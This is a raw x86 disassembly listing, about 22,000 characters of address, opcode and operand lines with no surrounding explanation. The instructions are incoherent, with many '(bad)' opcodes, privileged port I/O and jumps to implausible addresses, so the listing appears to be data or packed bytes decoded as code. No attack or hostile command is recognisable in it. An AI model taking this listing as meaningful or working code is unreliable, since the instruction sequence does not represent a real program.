  41b174:	or     ecx,edx
  41b176:	and    DWORD PTR [eax],edi
  41b178:	jmp    0x41b128
  41b17a:	ja     0x41b11c
  41b17c:	aas    
  41b17d:	xchg   edi,eax
  41b17e:	arpl   sp,cx
  41b180:	sar    DWORD PTR [ebx],0x97
  41b183:	adc    eax,0x9f02acfe
  41b188:	icebp  
  41b189:	mov    al,0xec
  41b18b:	test   al,0xa0
  41b18d:	test   bl,ah
  41b18f:	outs   dx,BYTE PTR ds:[esi]
  41b190:	sub    eax,0xc819ea96
  41b195:	pop    es
  41b196:	(bad)  
  41b197:	je     0x41b17c
  41b199:	test   al,0xf2
  41b19b:	lock xor edx,esp
  41b19e:	sahf   
  41b19f:	into   
  41b1a0:	daa    
  41b1a1:	jmp    0x41b15b
  41b1a3:	cmp    ecx,DWORD PTR [eax-0x3d]
  41b1a6:	mov    al,gs:0x7978dcb1
  41b1ac:	push   es
  41b1ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1ae:	dec    eax
  41b1af:	fwait
  41b1b0:	lahf   
  41b1b1:	or     BYTE PTR [ecx+0x17e34826],dh
  41b1b7:	mov    dh,0x5d
  41b1b9:	jl     0x41b16f
  41b1bb:	stc    
  41b1bc:	lods   al,BYTE PTR ds:[esi]
  41b1bd:	shr    BYTE PTR [edi+0x4fabbc3f],1
  41b1c3:	push   es
  41b1c4:	mov    ch,0xec
  41b1c6:	scas   ax,WORD PTR es:[edi]
  41b1c8:	jae    0x41b1d2
  41b1ca:	call   0x854d:0xfe4db3cb
  41b1d1:	fwait
  41b1d2:	adc    BYTE PTR [edi],dh
  41b1d4:	xor    cl,dh
  41b1d6:	fmul   DWORD PTR [eax-0x3f]
  41b1d9:	add    al,0x43
  41b1db:	dec    esp
  41b1dc:	das    
  41b1dd:	(bad)  
  41b1de:	fwait
  41b1df:	cmp    eax,esp
  41b1e1:	fdivr  st,st(2)
  41b1e3:	ficomp WORD PTR [ebx+0x58]
  41b1e6:	mov    dh,0xc3
  41b1e8:	(bad)  
  41b1e9:	out    0xb7,al
  41b1eb:	test   DWORD PTR [edi+eiz*8-0x39],esi
  41b1ef:	and    eax,0x3d9a7b12
  41b1f5:	cmp    al,0x34
  41b1f7:	rcl    DWORD PTR [edi],1
  41b1f9:	or     esp,DWORD PTR [ecx-0x23b4736b]
  41b1ff:	or     DWORD PTR [ecx-0x3c],eax
  41b202:	jne    0x41b197
  41b204:	div    DWORD PTR [eax+edi*8]
  41b207:	rcl    BYTE PTR ds:0x321e5a78,1
  41b20d:	lods   al,BYTE PTR ds:[esi]
  41b20e:	fmul   QWORD PTR [ebx-0x275b56e2]
  41b214:	bound  edi,QWORD PTR [esi]
  41b216:	ins    DWORD PTR es:[edi],dx
  41b217:	mov    cl,0xbd
  41b219:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b21b:	jno    0x41b1a3
  41b21d:	test   eax,0x5ae0f2b2
  41b222:	mov    ebx,esi
  41b224:	cmp    al,al
  41b226:	in     eax,0x68
  41b228:	jp     0x41b2a6
  41b22a:	rol    edi,cl
  41b22c:	lea    edx,[ebx-0x729cae73]
  41b232:	and    BYTE PTR [eax],ch
  41b234:	test   edx,edx
  41b236:	pop    ebx
  41b237:	pushf  
  41b238:	jns    0x41b209
  41b23a:	stos   BYTE PTR es:[edi],al
  41b23b:	(bad)  
  41b23d:	adc    ebp,esi
  41b23f:	and    BYTE PTR [edx],dl
  41b241:	xchg   ebp,eax
  41b242:	clc    
  41b243:	mov    ?,WORD PTR [ebp+0x1cdebffa]
  41b249:	add    DWORD PTR [ecx-0x1f],ebp
  41b24c:	push   ds
  41b24d:	xor    al,0xfa
  41b24f:	and    al,0x23
  41b251:	dec    ecx
  41b252:	lock xchg esp,eax
  41b254:	xchg   ebp,eax
  41b255:	mov    bh,BYTE PTR [esi+0x3880f2ad]
  41b25b:	xor    al,0x9f
  41b25d:	sbb    edx,DWORD PTR [edi]
  41b25f:	mov    bh,0xc8
  41b261:	jne    0x41b240
  41b263:	pop    esp
  41b264:	ret    0x4492
  41b267:	pop    edi
  41b268:	lock xchg esi,eax
  41b26a:	mov    ebp,?
  41b26c:	je     0x41b26c
  41b26e:	adc    esi,edi
  41b270:	(bad)  
  41b271:	outs   dx,DWORD PTR ds:[esi]
  41b272:	push   esp
  41b273:	pop    ebx
  41b274:	mov    ds:0x3c81ca5e,al
  41b279:	aas    
  41b27a:	ins    BYTE PTR es:[edi],dx
  41b27b:	add    ch,BYTE PTR [eax]
  41b27d:	jnp    0x41b237
  41b27f:	std    
  41b280:	mov    ecx,0xacdd3136
  41b285:	gs gs jae 0x41b2d6
  41b289:	inc    ebp
  41b28a:	xor    ebp,ebx
  41b28c:	ror    BYTE PTR [edx],cl
  41b28e:	mov    ebx,0x73455633
  41b293:	and    al,0x95
  41b295:	inc    ecx
  41b296:	xor    esp,esi
  41b298:	cli    
  41b299:	pop    esi
  41b29a:	lahf   
  41b29b:	jecxz  0x41b2d0
  41b29d:	adc    ecx,0x185bea99
  41b2a3:	in     eax,0xfb
  41b2a5:	jns    0x41b296
  41b2a7:	jbe    0x41b229
  41b2a9:	mov    ds:0x7ade9dbb,al
  41b2ae:	sub    al,0xf3
  41b2b0:	push   ecx
  41b2b1:	ds loop 0x41b2e1
  41b2b4:	xchg   ebp,eax
  41b2b5:	je     0x41b2a9
  41b2b7:	lods   al,BYTE PTR ds:[esi]
  41b2b8:	test   eax,0xb7592cc8
  41b2bd:	adc    ecx,ebp
  41b2bf:	cmp    eax,0xef4a0aab
  41b2c4:	(bad)  
  41b2c7:	loop   0x41b2c5
  41b2c9:	mul    BYTE PTR [edx+0x53885502]
  41b2cf:	sub    dl,ah
  41b2d1:	aad    0xab
  41b2d3:	daa    
  41b2d4:	ss out 0xf8,eax
  41b2d7:	mov    edi,0xe5a9cdc9
  41b2dc:	pop    ebx
  41b2dd:	leave  
  41b2de:	push   ecx
  41b2df:	test   ah,0x46
  41b2e2:	mov    ds:0x5a37d728,al
  41b2e7:	sar    ecx,cl
  41b2e9:	pop    ds
  41b2ea:	push   0xd91b33d3
  41b2ef:	mov    dl,0x99
  41b2f1:	dec    eax
  41b2f2:	push   ebx
  41b2f3:	mov    ah,0x40
  41b2f5:	mov    edx,0x5b2ce809
  41b2fa:	inc    esp
  41b2fb:	sbb    al,0x6
  41b2fd:	push   eax
  41b2fe:	xchg   esi,eax
  41b2ff:	add    eax,0x9cf4e7bf
  41b304:	xchg   ebp,eax
  41b305:	repz mov eax,0x3d33bf70
  41b30b:	loop   0x41b2e7
  41b30d:	mov    eax,0xd41d70
  41b312:	cmp    BYTE PTR [ecx-0xf],ah
  41b315:	fmul   DWORD PTR [ecx]
  41b317:	dec    edi
  41b318:	push   edi
  41b319:	xor    eax,0x84dae459
  41b31e:	cmp    DWORD PTR [ecx+edx*8-0x625f0632],0x25545917
  41b329:	outs   dx,DWORD PTR ds:[esi]
  41b32a:	pop    esp
  41b32b:	outs   dx,DWORD PTR ds:[esi]
  41b32c:	adc    al,0xa7
  41b32e:	adc    al,0x77
  41b330:	push   ebp
  41b331:	sbb    dh,BYTE PTR [esi]
  41b333:	pop    ebx
  41b334:	pop    ebx
  41b335:	enter  0xd852,0xaf
  41b339:	loop   0x41b2cd
  41b33b:	test   BYTE PTR [ebx],dh
  41b33d:	retf   
  41b33e:	pop    es
  41b33f:	push   ecx
  41b340:	lea    edi,[ebp-0x495ce1ba]
  41b346:	inc    edi
  41b347:	pop    edx
  41b348:	xor    dl,BYTE PTR ds:0x72030868
  41b34e:	int    0xf3
  41b350:	test   al,0xe1
  41b352:	fnsave [edx]
  41b354:	mov    al,0xa4
  41b356:	stc    
  41b357:	and    dl,BYTE PTR [ebp+0x12c28256]
  41b35d:	cld    
  41b35e:	sub    BYTE PTR [edi],0x94
  41b361:	imul   ebx,DWORD PTR [edi+0x37],0xfc20b9f2
  41b368:	in     eax,dx
  41b369:	mov    ch,dl
  41b36b:	stos   BYTE PTR es:[edi],al
  41b36c:	clc    
  41b36d:	adc    ah,cl
  41b36f:	sub    BYTE PTR [eax],0xee
  41b372:	and    BYTE PTR [ecx-0x1c],ch
  41b375:	dec    eax
  41b376:	cmp    ebx,DWORD PTR [eax]
  41b378:	push   dx
  41b37a:	dec    edx
  41b37b:	push   ebx
  41b37c:	and    dh,dl
  41b37e:	xor    edx,eax
  41b380:	fsub   QWORD PTR [edi+0x90c23f7]
  41b386:	xor    esi,ebx
  41b388:	repnz leave 
  41b38a:	adc    DWORD PTR [ecx-0x3bdba218],eax
  41b390:	in     al,0xb7
  41b392:	inc    esi
  41b393:	and    eax,esp
  41b395:	cmp    al,0xd1
  41b397:	push   edx
  41b398:	ror    BYTE PTR [eax+0x4a5a2717],cl
  41b39e:	sub    eax,0x8af707cb
  41b3a3:	dec    edi
  41b3a4:	out    dx,al
  41b3a5:	test   al,0x70
  41b3a7:	fdivr  DWORD PTR [edi+0x5e]
  41b3aa:	and    ebx,ebx
  41b3ac:	pop    ss
  41b3ad:	rcl    DWORD PTR [eax],1
  41b3af:	jo     0x41b3e1
  41b3b1:	stos   BYTE PTR es:[edi],al
  41b3b2:	clc    
  41b3b3:	mov    esi,0x12e535fa
  41b3b8:	xor    eax,0xc3c95f71
  41b3bd:	mov    al,0x3
  41b3bf:	neg    edx
  41b3c1:	popa   
  41b3c2:	cmc    
  41b3c3:	and    eax,0x90bb4626
  41b3c8:	sub    DWORD PTR [edi],edx
  41b3ca:	xchg   ecx,eax
  41b3cb:	je     0x41b432
  41b3cd:	or     edi,eax
  41b3cf:	repz dec eax
  41b3d1:	pop    esp
  41b3d2:	sbb    al,0x1a
  41b3d4:	cmp    ch,BYTE PTR [ebx+0x25]
  41b3d7:	enter  0x3a4c,0xda
  41b3db:	and    al,0xf6
  41b3dd:	aam    0x7c
  41b3df:	lock loop 0x41b45d
  41b3e2:	imul   edx,edx,0x12
  41b3e5:	lods   al,BYTE PTR ds:[esi]
  41b3e6:	loope  0x41b414
  41b3e8:	add    eax,0xa226695b
  41b3ed:	mov    bl,0x69
  41b3ef:	mov    edi,0x154fa223
  41b3f4:	stos   BYTE PTR es:[edi],al
  41b3f5:	push   0xc58b4483
  41b3fa:	mov    eax,0xe8cdeb40
  41b3ff:	and    DWORD PTR [eax],eax
  41b401:	in     al,dx
  41b402:	iret   
  41b403:	cmp    BYTE PTR [edx-0x267699a1],0xd6
  41b40a:	test   eax,0x1c19607a
  41b40f:	xchg   esi,eax
  41b410:	push   ecx
  41b411:	fld    DWORD PTR [edx+0x338e297b]
  41b417:	mov    ds:0xfbb10c53,al
  41b41c:	div    BYTE PTR [eax-0x35]
  41b41f:	push   ds
  41b420:	jecxz  0x41b44d
  41b422:	cs div esi
  41b425:	push   es
  41b426:	mov    bh,0x3a
  41b428:	test   eax,0x81f47645
  41b42d:	les    esp,FWORD PTR [ecx]
  41b42f:	adc    DWORD PTR [ebx-0x2ce1f9a],ebx
  41b435:	sbb    al,0xcc
  41b437:	jmp    0x239a6e76
  41b43c:	addr16 icebp 
  41b43e:	mov    bl,0xa7
  41b440:	jo     0x41b456
  41b442:	sbb    ecx,DWORD PTR [edi-0x163d7a69]
  41b448:	outs   dx,BYTE PTR ds:[esi]
  41b449:	jge    0x41b42c
  41b44b:	bound  edx,QWORD PTR [ecx-0xa273648]
  41b451:	fs pop ecx
  41b453:	and    BYTE PTR [ebx-0x7d3c04b5],0x9f
  41b45a:	jnp    0x41b3e9
  41b45c:	scas   eax,DWORD PTR es:[edi]
  41b45d:	pop    ecx
  41b45e:	pushf  
  41b45f:	scas   al,BYTE PTR es:[edi]
  41b460:	out    dx,al
  41b461:	(bad)
  41b464:	cmp    eax,0x31b38056
  41b469:	add    bh,bh
  41b46b:	mov    ch,0xfc
  41b46d:	mov    bl,0x58
  41b46f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b470:	sub    eax,0x455be837
  41b475:	bound  ebp,QWORD PTR [edx+0x62671fe8]
  41b47b:	sahf   
  41b47c:	mov    edi,0x9c536190
  41b481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b482:	add    bh,bl
  41b484:	xor    dh,BYTE PTR ds:0xfb40f06c
  41b48a:	ds sbb al,0xf7
  41b48d:	mov    dl,0xaf
  41b48f:	xchg   ebx,edx
  41b491:	arpl   WORD PTR [edi+0x5a],bx
  41b494:	inc    esp
  41b495:	sub    DWORD PTR [eax],eax
  41b497:	add    eax,0x30775e4d
  41b49c:	pop    esi
  41b49d:	jecxz  0x41b45e
  41b49f:	jno    0x41b4a4
  41b4a1:	mov    ebp,DWORD PTR [edx+edi*1-0x162e5a21]
  41b4a8:	ret    
  41b4a9:	sub    al,0x41
  41b4ab:	aam    0xb4
  41b4ad:	dec    esp
  41b4ae:	call   0x2b72:0xed2ae8e1
  41b4b5:	add    al,0xea
  41b4b7:	arpl   bp,di
  41b4b9:	pop    ss
  41b4ba:	leave  
  41b4bb:	push   esp
  41b4bc:	dec    di
  41b4be:	shl    bh,1
  41b4c0:	es jno 0x41b4ed
  41b4c3:	retf   
  41b4c4:	push   cs
  41b4c5:	out    dx,al
  41b4c6:	pop    edi
  41b4c7:	fcomp  DWORD PTR [edi+0x38]
  41b4ca:	fs int 0xe2
  41b4cd:	repz (bad) 
  41b4cf:	repz xchg esi,ebp
  41b4d2:	(bad)  
  41b4d3:	(bad)  
  41b4d4:	imul   edi,DWORD PTR [eax-0x2e436355],0xffffffba
  41b4db:	xor    DWORD PTR [ebx-0x10e4efa6],edi
  41b4e1:	addr16 mov dl,0xb8
  41b4e4:	rcr    DWORD PTR [ebx-0xca420ed],1
  41b4ea:	sbb    dh,ch
  41b4ec:	ret    
  41b4ed:	dec    ebx
  41b4ee:	and    ch,BYTE PTR [ebx+esi*4]
  41b4f1:	pop    ecx
  41b4f2:	fcomp  DWORD PTR [ebx+0x592120a5]
  41b4f8:	sbb    bl,dl
  41b4fa:	push   ebp
  41b4fb:	ss xor DWORD PTR es:[ebx],edx
  41b4ff:	adc    al,0xf6
  41b501:	mov    esp,es
  41b503:	sub    eax,0x62a91c9c
  41b508:	fiadd  DWORD PTR [edi-0x53]
  41b50b:	ss hlt 
  41b50d:	test   DWORD PTR [edx-0x22],edx
  41b510:	in     al,dx
  41b511:	or     eax,0x20cb2c56
  41b516:	out    dx,eax
  41b517:	push   es
  41b518:	je     0x41b4eb
  41b51a:	clc    
  41b51b:	jmp    0x5c77a992
  41b520:	push   ecx
  41b521:	sbb    al,0x2d
  41b523:	dec    esp
  41b524:	nop
  41b525:	fwait
  41b526:	arpl   WORD PTR [ecx+0x5c],bx
  41b529:	mov    dh,0x13
  41b52b:	push   0xaee10e4e
  41b530:	inc    esp
  41b531:	mov    DWORD PTR [eax],eax
  41b533:	add    eax,0xe401361a
  41b538:	mov    esp,0x459b542c
  41b53d:	ret    
  41b53e:	ins    DWORD PTR es:[edi],dx
  41b53f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b540:	xor    bh,BYTE PTR [edi-0x7248cf67]
  41b546:	cmp    al,0x10
  41b548:	mov    ecx,0x493b2c1c
  41b54d:	ins    BYTE PTR es:[edi],dx
  41b54e:	cmp    al,0xce
  41b550:	clc    
  41b551:	adc    BYTE PTR es:[ebp+0x4369c63d],cl
  41b558:	ja     0x41b56c
  41b55a:	lea    esp,[ebx+0x16]
  41b55d:	out    dx,eax
  41b55e:	loope  0x41b5b0
  41b560:	cmp    eax,0x5b48d339
  41b565:	test   edi,edx
  41b567:	je     0x41b5d3
  41b569:	outs   dx,BYTE PTR ds:[esi]
  41b56a:	lods   eax,DWORD PTR ds:[esi]
  41b56c:	loop   0x41b59e
  41b56e:	inc    edi
  41b56f:	lahf   
  41b570:	mov    ecx,0xd6f82514
  41b575:	js     0x41b5db
  41b577:	mov    ds:0x3a57abe1,al
  41b57c:	pop    ebp
  41b57d:	call   0xf8111fef
  41b582:	sti    
  41b583:	or     eax,0x3066d852
  41b588:	push   ds
  41b589:	cld    
  41b58a:	dec    esi
  41b58b:	add    bh,BYTE PTR [ebp-0x5e]
  41b58e:	les    edx,FWORD PTR [ebx+0x50bf640e]
  41b594:	xor    eax,0x1ced3b13
  41b599:	fwait
  41b59a:	ret    0x9fcd
  41b59d:	jecxz  0x41b563
  41b59f:	push   cs
  41b5a0:	sub    bl,cl
  41b5a2:	test   eax,0xde7144dc
  41b5a7:	push   0xfffffffc
  41b5a9:	push   cs
  41b5aa:	fimul  DWORD PTR [edi]
  41b5ac:	(bad)  [edi-0x80]
  41b5af:	mov    ch,0x3f
  41b5b1:	inc    edx
  41b5b2:	jl     0x41b623
  41b5b4:	xchg   esi,eax
  41b5b5:	adc    ebx,esi
  41b5b7:	or     BYTE PTR [ecx-0x76],0xeb
  41b5bb:	xor    al,0x93
  41b5bd:	jmp    0x41b616
  41b5bf:	adc    ch,BYTE PTR [ebx+0x7054fb82]
  41b5c5:	inc    ebx
  41b5c6:	dec    ecx
  41b5c7:	mov    eax,0xe8552b9e
  41b5cc:	les    edx,FWORD PTR [eax]
  41b5ce:	mov    al,ds:0x679219a
  41b5d3:	mov    dh,0xb3
  41b5d5:	lahf   
  41b5d6:	sbb    al,0xbf
  41b5d8:	jle    0x41b5f0
  41b5da:	sbb    al,0x63
  41b5dc:	or     edx,DWORD PTR gs:[edx]
  41b5df:	cmp    al,0x78
  41b5e1:	ss or  eax,0x59246e80
  41b5e7:	out    0x5e,al
  41b5e9:	mov    ebp,0x2a6ca4ea
  41b5ee:	icebp  
  41b5ef:	xor    DWORD PTR [esi-0x19],edi
  41b5f2:	test   bh,0x87
  41b5f5:	push   ebx
  41b5f6:	adc    al,0xfc
  41b5f8:	adc    BYTE PTR [esi+esi*4+0x2e],cl
  41b5fc:	ja     0x41b5de
  41b5fe:	jecxz  0x41b617
  41b600:	sahf   
  41b601:	push   edi
  41b602:	aad    0x2e
  41b604:	mov    edi,0xccd472d8
  41b609:	pop    esp
  41b60a:	mov    esp,0xfd62f063
  41b60f:	fsubr  st,st(3)
  41b611:	dec    eax
  41b612:	stos   BYTE PTR es:[edi],al
  41b613:	scas   al,BYTE PTR es:[edi]
  41b614:	test   eax,0xf17ca891
  41b619:	mov    esi,0xc3a50639
  41b61e:	sbb    BYTE PTR [ebp-0x16],al
  41b621:	in     eax,dx
  41b622:	dec    ebx
  41b623:	xchg   ebx,eax
  41b624:	mov    cl,0x8b
  41b626:	fmul   DWORD PTR [ecx+0xe6295df]
  41b62c:	jne    0x41b5f5
  41b62e:	xchg   edx,eax
  41b62f:	inc    edx
  41b630:	in     al,0x54
  41b632:	sub    BYTE PTR [eax-0xe],bh
  41b635:	mov    ebx,0x539ecf53
  41b63a:	leave  
  41b63b:	in     eax,0xd6
  41b63d:	imul   DWORD PTR [edi]
  41b63f:	retf   
  41b640:	xchg   edx,eax
  41b641:	stc    
  41b642:	ret    0xb59b
  41b645:	mov    ebp,edi
  41b647:	data16 aam 0xa2
  41b64a:	shl    BYTE PTR [edx],0x80
  41b64d:	cmp    DWORD PTR [ebx-0x36],ebx
  41b650:	or     DWORD PTR [ecx],esp
  41b652:	popf   
  41b653:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b654:	xchg   esp,eax
  41b655:	xor    eax,ebp
  41b657:	cld    
  41b658:	mov    ds:0x248cc0a6,eax
  41b65d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b65e:	pusha  
  41b65f:	fwait
  41b660:	nop
  41b661:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b662:	add    ebx,DWORD PTR [edi+0x50]
  41b665:	inc    esp
  41b666:	mov    esi,0x331e96a0
  41b66b:	jmp    0x41b6af
  41b66d:	jbe    0x41b6d5
  41b66f:	enter  0x413,0x49
  41b673:	mov    DWORD PTR [ecx-0x35bb3a3f],ebx
  41b679:	sbb    BYTE PTR [esi-0x6d],ch
  41b67c:	adc    esp,DWORD PTR [esi-0x3391d230]
  41b682:	ins    BYTE PTR es:[edi],dx
  41b683:	into   
  41b684:	add    eax,0x3f7c484a
  41b689:	icebp  
  41b68a:	or     edx,DWORD PTR [edi]
  41b68c:	pop    ecx
  41b68d:	add    edi,esi
  41b68f:	cmp    BYTE PTR ss:[edi+0x2f],0x4
  41b694:	add    al,0xe5
  41b696:	push   edi
  41b697:	ins    BYTE PTR es:[edi],dx
  41b698:	popa   
  41b699:	loop   0x41b66e
  41b69b:	jo     0x41b6c7
  41b69d:	cli    
  41b69e:	repz push cs
  41b6a0:	cld    
  41b6a1:	mov    eax,0x595b4dc6
  41b6a6:	in     al,dx
  41b6a7:	scas   eax,DWORD PTR es:[edi]
  41b6a8:	sbb    al,0x5d
  41b6aa:	popa   
  41b6ab:	test   DWORD PTR [edi-0x491a2f77],0x61854537
  41b6b5:	das    
  41b6b6:	lock shl DWORD PTR [ebp+edx*1+0x1b6f5907],1
  41b6be:	leave  
  41b6bf:	cmc    
  41b6c0:	outs   dx,DWORD PTR ds:[esi]
  41b6c1:	test   bh,ch
  41b6c3:	cmp    al,0x8a
  41b6c5:	loope  0x41b730
  41b6c7:	adc    BYTE PTR [esi],bh
  41b6c9:	push   esi
  41b6ca:	rcr    DWORD PTR [ebx-0x37],cl
  41b6cd:	push   0x52
  41b6cf:	ds into 
  41b6d1:	xor    esi,DWORD PTR [ebx]
  41b6d3:	sbb    eax,0xb5516ba8
  41b6d8:	inc    edx
  41b6d9:	push   ds
  41b6da:	xchg   ebx,eax
  41b6db:	dec    esp
  41b6dc:	sbb    eax,0x1aa6048d
  41b6e1:	scas   al,BYTE PTR es:[edi]
  41b6e2:	mov    cl,0xa4
  41b6e4:	rcl    DWORD PTR [esi+0x73],cl
  41b6e7:	not    ch
  41b6e9:	fnstenv [esi-0x1]
  41b6ec:	es mov edx,esi
  41b6ef:	jecxz  0x41b6fe
  41b6f1:	jnp    0x41b711
  41b6f3:	xchg   ecx,eax
  41b6f4:	lahf   
  41b6f5:	pop    edx
  41b6f6:	pushf  
  41b6f7:	mov    ds:0x7a420b6e,al
  41b6fc:	add    DWORD PTR [esi+edi*1],edi
  41b6ff:	mov    ebx,0x1a9682a3
  41b704:	dec    edx
  41b705:	jb     0x41b71f
  41b707:	mov    BYTE PTR [ebx],bl
  41b709:	and    esp,esi
  41b70b:	xor    BYTE PTR [edi+0x6328366b],bl
  41b711:	test   eax,0x758732f6
  41b716:	popa   
  41b717:	dec    eax
  41b718:	arpl   ax,sp
  41b71a:	aas    
  41b71b:	push   eax
  41b71c:	push   esi
  41b71d:	lods   al,BYTE PTR ds:[esi]
  41b71e:	rcl    al,1
  41b720:	sbb    eax,0x9a1ba141
  41b725:	mov    ss,WORD PTR [edi]
  41b727:	dec    esi
  41b728:	das    
  41b729:	mov    ch,0x48
  41b72b:	jne    0x41b74b
  41b72d:	jl     0x41b6e0
  41b72f:	aaa    
  41b730:	imul   ebx,DWORD PTR [esi-0x1],0xa9f44b6c
  41b737:	sub    BYTE PTR [eax],dh
  41b739:	sbb    eax,0x5f76c2c6
  41b73e:	(bad)  
  41b73f:	aad    0x34
  41b741:	ror    DWORD PTR [eax+0x1b],1
  41b744:	mov    edi,0xe5197773
  41b749:	fist   DWORD PTR [ecx-0x2f9f7ff2]
  41b74f:	aad    0x93
  41b751:	sub    al,0x39
  41b753:	les    esi,FWORD PTR [eax]
  41b755:	dec    ecx
  41b756:	popf   
  41b757:	sub    cl,BYTE PTR [esi-0x3bc7c8c9]
  41b75d:	sub    esp,DWORD PTR [ebx-0x3c]
  41b760:	jno    0x41b736
  41b762:	jae    0x41b787
  41b764:	adc    al,0x68
  41b766:	cdq    
  41b767:	lock push ss
  41b769:	test   BYTE PTR [ebx-0x503bcc64],dh
  41b76f:	scas   eax,DWORD PTR es:[edi]
  41b770:	inc    ecx
  41b771:	jns    0x41b76b
  41b773:	shl    BYTE PTR [esp+eax*8],0x7b
  41b777:	hlt    
  41b778:	outs   dx,DWORD PTR ds:[esi]
  41b779:	das    
  41b77a:	push   ebx
  41b77b:	inc    esp
  41b77c:	shl    BYTE PTR [esi-0x3a9f9f6c],1
  41b782:	adc    cl,bh
  41b784:	pop    eax
  41b785:	popa   
  41b786:	lock sbb DWORD PTR [eax-0x1aba52b3],ecx
  41b78d:	mov    ?,WORD PTR [ebp-0x49]
  41b790:	mov    edx,0xb007da4
  41b795:	cld    
  41b796:	pop    ebp
  41b797:	jmp    esp
  41b799:	outs   dx,BYTE PTR ds:[esi]
  41b79a:	or     dl,BYTE PTR [ebp+0x4154bf7]
  41b7a0:	mov    esi,0xf4fded2a
  41b7a5:	sbb    ch,BYTE PTR [ebx]
  41b7a7:	adc    dl,BYTE PTR [eax]
  41b7a9:	aam    0xf6
  41b7ab:	in     al,dx
  41b7ac:	and    ebp,edx
  41b7ae:	shl    eax,cl
  41b7b0:	mov    eax,ds:0x82c739cc
  41b7b5:	test   BYTE PTR [ecx-0x70],dh
  41b7b8:	ins    DWORD PTR es:[edi],dx
  41b7b9:	and    al,0x7
  41b7bb:	cld    
  41b7bc:	jnp    0x41b83a
  41b7be:	or     bl,cl
  41b7c0:	je     0x41b7f7
  41b7c2:	outs   dx,DWORD PTR ds:[esi]
  41b7c3:	inc    ebp
  41b7c4:	mov    ds:0x31229f09,al
  41b7c9:	leave  
  41b7ca:	inc    ebx
  41b7cb:	pushf  
  41b7cc:	sbb    DWORD PTR [edi-0x25581548],esp
  41b7d2:	mov    WORD PTR [esi-0x4edc506],ds
  41b7d8:	mov    BYTE PTR [edx],0x2b
  41b7db:	sub    eax,0x867170a2
  41b7e0:	aam    0x47
  41b7e2:	ins    BYTE PTR es:[edi],dx
  41b7e3:	inc    esi
  41b7e4:	rol    DWORD PTR [edx],1
  41b7e6:	aad    0xcd
  41b7e8:	mov    esp,0xb6dd00fb
  41b7ed:	sbb    esp,ebp
  41b7ef:	rcl    BYTE PTR [ebx+0x4d],1
  41b7f2:	pop    ecx
  41b7f3:	bound  ebx,QWORD PTR ds:0x7e8bb4ce
  41b7f9:	fwait
  41b7fa:	aam    0x8d
  41b7fc:	sahf   
  41b7fd:	test   BYTE PTR [eax],0xa3
  41b800:	or     ebp,DWORD PTR [ebp+0x69bf1ede]
  41b806:	jb     0x41b78a
  41b808:	push   edx
  41b809:	daa    
  41b80a:	(bad)  
  41b80b:	jle    0x41b82b
  41b80d:	lahf   
  41b80e:	add    dh,BYTE PTR [edx]
  41b810:	in     eax,0x10
  41b812:	nop    DWORD PTR [eax]
  41b815:	push   edi
  41b816:	mov    dl,0xa8
  41b818:	jl     0x41b813
  41b81a:	pop    ds
  41b81b:	pop    esp
  41b81c:	fadd   QWORD PTR [edx+eiz*8]
  41b81f:	dec    esi
  41b820:	add    eax,0xfe9dfa3a
  41b825:	push   ebx
  41b826:	dec    edx
  41b827:	pop    ds
  41b828:	jp     0x41b85e
  41b82a:	xlat   BYTE PTR ds:[ebx]
  41b82b:	xor    al,0xe8
  41b82d:	push   0xbcb9db0a
  41b832:	pop    ecx
  41b833:	outs   dx,BYTE PTR ds:[esi]
  41b834:	pop    esi
  41b835:	inc    ebx
  41b836:	cmp    ecx,DWORD PTR [edi]
  41b838:	or     al,0xe1
  41b83a:	sbb    BYTE PTR [edi],al
  41b83c:	inc    ebx
  41b83d:	inc    DWORD PTR [edi]
  41b83f:	mov    edi,0x29abc975
  41b844:	and    BYTE PTR [edi+0x5],cl
  41b847:	inc    esi
  41b848:	aad    0x8
  41b84a:	mov    al,0xc1
  41b84c:	fcom   DWORD PTR [ebp+esi*1-0x54294fa3]
  41b853:	adc    edi,DWORD PTR [edi+0x2f]
  41b856:	sti    
  41b857:	mov    cl,0xd3
  41b859:	mov    eax,0x5cf05e48
  41b85e:	lock ja 0x41b8cf
  41b861:	cmp    dl,0x98
  41b864:	cmp    al,BYTE PTR [ebp+0x76]
  41b867:	js     0x41b827
  41b869:	das    
  41b86a:	push   esp
  41b86b:	jge    0x41b850
  41b86d:	leave  
  41b86e:	push   0x4930289d
  41b873:	outs   dx,BYTE PTR ds:[esi]
  41b874:	cmp    esi,DWORD PTR [ecx+edi*4]
  41b877:	cmp    eax,0x44b5b166
  41b87c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b87d:	fwait
  41b87e:	xchg   DWORD PTR [edi+0x89e8633],edx
  41b884:	test   al,0xf2
  41b886:	shl    bl,cl
  41b888:	add    al,0x5
  41b88a:	shl    bl,cl
  41b88c:	int3   
  41b88d:	mov    al,0x13
  41b88f:	repz cld 
  41b891:	mov    esp,0xa17c8052
  41b896:	cmp    dh,0x92
  41b899:	aaa    
  41b89a:	push   esp
  41b89b:	push   edi
  41b89c:	and    esi,ecx
  41b89e:	ret    0xfb3
  41b8a1:	in     al,dx
  41b8a2:	pop    ecx
  41b8a3:	mov    ds:0x699d7d71,eax
  41b8a8:	cmp    dl,ch
  41b8aa:	xor    BYTE PTR [ebx-0x12],bh
  41b8ad:	push   ebp
  41b8ae:	cld    
  41b8af:	xchg   edi,eax
  41b8b0:	int3   
  41b8b1:	push   eax
  41b8b2:	push   esp
  41b8b3:	mov    cl,0x5e
  41b8b5:	lahf   
  41b8b6:	cld    
  41b8b7:	sbb    esp,ebx
  41b8b9:	jg     0x41b85d
  41b8bb:	dec    esi
  41b8bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8bd:	ror    BYTE PTR [ecx],cl
  41b8bf:	dec    esp
  41b8c0:	push   ds
  41b8c1:	mov    esp,0x378067e7
  41b8c6:	dec    esi
  41b8c7:	push   ebp
  41b8c8:	inc    esi
  41b8c9:	imul   ebp,DWORD PTR [ebp-0x8],0x12
  41b8cd:	xchg   ch,ah
  41b8cf:	dec    esp
